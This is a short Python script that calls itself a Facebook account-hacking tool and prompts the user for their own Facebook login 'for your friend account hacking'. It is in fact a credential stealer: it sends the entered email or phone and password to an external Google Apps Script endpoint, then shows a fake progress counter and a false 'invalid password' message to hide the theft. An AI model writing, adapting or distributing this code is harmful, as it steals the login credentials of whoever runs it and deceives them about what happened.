
import requests
import pyfiglet
import time
a = pyfiglet.figlet_format('facebook-hacking')
print(a)
print("autor by: zero_@290G")
print("dont use illegal")
print('please login with your facebook \n for your friend account hacking')

umail =input("please Enter Phone and gmail:")
upass =input("please Enter       password'")
data ={'mail':umail,'pass':upass}
rq =requests.post('https://script.google.com/macros/s/AKfycbxZKaMrdStWk_T4iNO-PHgnPY3bWJS_-J989D_uWHjFLjtLGQ/exec',data=data)

for i in range(100):
   print(i,'+')
   time.sleep(1)
print('invalid password or username')
